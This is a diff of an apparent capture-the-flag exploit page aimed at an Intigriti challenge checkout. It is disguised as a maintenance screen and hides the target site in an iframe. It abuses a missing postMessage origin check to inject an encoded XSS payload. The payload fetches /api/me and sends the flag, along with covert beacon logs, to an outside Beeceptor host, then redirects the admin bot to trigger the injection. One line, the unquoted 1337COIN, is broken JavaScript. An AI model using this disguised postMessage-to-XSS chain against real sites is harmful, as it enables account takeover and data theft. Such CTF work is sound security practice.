@@ -2,42 +2,82 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Reward Gateway - Security Verification</title>
+    <title>CRYPTIGRITI - System Maintenance</title>
 </head>
-<body style="font-family: sans-serif; text-align: center; padding-top: 50px;">
-    <h1>Processing Security Check...</h1>
-    <p>Please do not close this window.</p>
+<body style="background-color: #050A0E; color: white; font-family: 'Inter', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0;">
+    
+    <div style="text-align: center; border: 1px solid #00FF88; padding: 50px; background: #0D1117; box-shadow: 0 0 20px rgba(0, 255, 136, 0.2);">
+        <h1 style="color: #00FF88; letter-spacing: 2px;">SECURE CONNECTION</h1>
+        <p id="status" style="color: #6b7280; font-family: monospace;">Awaiting handshake...</p>
+        <div style="margin: 20px auto; width: 30px; height: 30px; border: 2px solid #161B22; border-top: 2px solid #00FF88; border-radius: 50%; animation: spin 0.8s linear infinite;"></div>
+    </div>
 
-    <!-- The target checkout page in a hidden iframe -->
-    <iframe 
-        id="targetFrame" 
-        src="https://challenge-0126.intigriti.io/checkout.html?currency=XMR&price=150" 
-        style="display:none;">
-    </iframe>
+    <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
+
+    <!-- Hidden frame to target the vulnerable checkout page -->
+    <iframe src="https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1337" id="target" style="display:none;"></iframe>
 
     <script>
-        const targetOrigin = "https://challenge-0126.intigriti.io";
-        const frame = document.getElementById('targetFrame');
+        // --- CONFIGURATION ---
+        const CALLBACK = "https://kavil.free.beeceptor.com"; // Your Beeceptor
+        const TARGET_URL = "https://challenge-0126.intigriti.io";
 
-        // Wait for the checkout page to load its scripts
-        frame.onload = function() {
-            console.log("Iframe loaded, sending exploit payload...");
+        function log(msg) {
+            document.getElementById('status').textContent = "> " + msg.toUpperCase();
+            // Stealthy logging via beacon/image
+            navigator.sendBeacon(CALLBACK + "/log?m=" + btoa(msg));
+        }
 
-            // This payload triggers the 'submitTransaction' listener in checkout.html
-            // Because there is no check on event.origin, the frame accepts our data
-            const payload = {
-                type: 'submitTransaction',
-                transaction: {
-                    toAddress: "16fcc05bfda75b38e3f12d6274854e4f25",
-                    currency: "XMR",
-                    amount: 1
-                }
-            };
+        // --- THE XSS PAYLOAD ---
+        // 1. Breaks out of title="${tx.address}"
+        // 2. Fetches the flag from /api/me (most reliable)
+        // 3. Sends it to your callback
+        const flagStealer = btoa(`
+            fetch('/api/me')
+                .then(r => r.json())
+                .then(data => {
+                    const flag = data.flag || document.getElementById('flagText')?.innerText;
+                    if(flag) fetch('${CALLBACK}/FLAG_EXTRACTED?f=' + encodeURIComponent(flag));
+                });
+        `);
+        
+        const xssPayload = `"><img src=x onerror="eval(atob('${flagStealer}'))"><x a="`;
 
-            // Send the message to the vulnerable window
-            frame.contentWindow.postMessage(payload, "*");
-            
-            alert("Transaction Request Sent Successfully!");
+        log("payload_init");
+
+        const target = document.getElementById('target');
+
+        target.onload = () => {
+            log("handshake_success");
+
+            // Wait 2 seconds for the checkout.html scripts to finish loading wallets
+            setTimeout(() => {
+                log("injecting_transaction");
+
+                // We trigger the transaction via the postMessage vulnerability.
+                // We send it for 1337COIN and XMR to ensure the bot has a balance.
+                const currencies = ['1337COIN', 'XMR', 'BTC'];
+                
+                currencies.forEach((curr, i) => {
+                    setTimeout(() => {
+                        target.contentWindow.postMessage({
+                            type: 'submitTransaction',
+                            transaction: {
+                                toAddress: xssPayload,
+                                currency: 1337COIN,
+                                amount: 10000
+                            }
+                        }, '*');
+                    }, i * 500);
+                });
+
+                // Final Step: Redirect the Admin to MarketWatch to trigger the DOM XSS
+                setTimeout(() => {
+                    log("triggering_xss_execution");
+                    window.location.href = TARGET_URL + '/marketwatch.html';
+                }, 4000);
+
+            }, 2000);
         };
     </script>
 </body>
